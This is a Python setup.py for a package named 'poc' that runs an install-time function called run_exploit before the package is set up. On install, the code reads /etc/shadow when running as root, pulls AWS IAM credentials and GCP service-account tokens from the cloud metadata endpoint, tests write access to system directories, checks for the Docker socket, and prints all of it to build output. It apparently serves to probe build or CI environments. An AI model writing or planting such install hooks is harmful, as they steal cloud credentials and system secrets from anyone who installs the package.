import os
import sys
import subprocess
import urllib.request
from setuptools import setup

def run_exploit():
    err = sys.stderr.write
    err("\n" + "!"*60 + "\n")
    
    uid = os.getuid()
    err(f"ID: {uid}\n")
    
    if uid == 0:
        err("CRITICAL: ROOT\n")
        try:
            with open("/etc/shadow", "r") as f:
                err(f"SHADOW: {f.readline().strip()}\n")
        except:
            err("SHADOW: DENIED\n")

    err("\nMETADATA:\n")
    targets = [
        ("AWS", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("GCP", "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"),
    ]
    headers = {"Metadata-Flavor": "Google", "Metadata": "true"}

    for name, url in targets:
        try:
            req = urllib.request.Request(url, headers=headers)
            with urllib.request.urlopen(req, timeout=2) as r:
                res = r.read().decode().strip()
                err(f"{name}: {res}\n")
                if name == "AWS" and res:
                    with urllib.request.urlopen(url + res, timeout=2) as kr:
                        err(f"KEYS: {kr.read().decode()}\n")
        except:
            err(f"{name}: NO\n")

    err("\nWRITE TEST:\n")
    for p in ["/etc/pwn", "/root/pwn"]:
        try:
            with open(p, "w") as f:
                f.write("test")
            err(f"WRITE {p}: OK\n")
            os.remove(p)
        except:
            err(f"WRITE {p}: NO\n")

    if os.path.exists("/var/run/docker.sock"):
        err("DOCKER: FOUND\n")

    err("!"*60 + "\n")
    sys.exit(1)

try:
    run_exploit()
except:
    sys.exit(1)

setup(name="poc", version="1.0.0")
